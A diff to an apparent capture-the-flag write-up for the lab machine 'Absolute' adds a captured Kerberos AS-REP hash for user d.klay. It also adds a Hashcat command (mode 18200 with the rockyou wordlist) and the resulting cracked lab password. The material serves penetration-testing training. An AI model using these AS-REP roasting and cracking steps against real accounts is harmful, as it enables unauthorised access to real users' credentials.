@@ -284,11 +284,22 @@ $krb5asrep$23$d.klay@ABSOLUTE.HTB:1d58075187e21740632972a71b63366a$59fb8472a7162
 
 #### d.klay AS-REP Hash
 
+asrep.txt:
+
 ```
 $krb5asrep$23$d.klay@ABSOLUTE.HTB:1d58075187e21740632972a71b63366a$59fb8472a716222f8b6746a7b761a9444f91c439f171516c5c5a778c92d219059ddd7329ce822f25d2b4232fe29bc740efea55f3f01802769052b4bedfae21556026621a8170be6b79c4a5033b87eab5c077903dd5ce1e61afd860270587068824692bacc0deb1a9187df98430cb916c155965d1a2e69673a33a4770c479e87963e0ecb25b3df0d1c9f64f1e8ca9b7fd1f3433d39c071d3aec5b866aa6ba58140e9eea626e7d2d4b9c06397b9402e53b002cd59a16d6013d8717f6c81e860e94651fbbbd9312b0db491df5bbf82b917ab7057e6519491b10b29a0dd275f3ff79e1c120dd5a22e21d8b2fea60
 ```
 
 <mark style="color:yellow;">We can now take this hash offline and crack it to attempt to elevate our access.</mark>
+
+#### Hashcat
+
+```
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+d.klay:Darkmoonsky248girl
+```
+
+Password cracked!
 
 #### Subdomain Enumeration
 
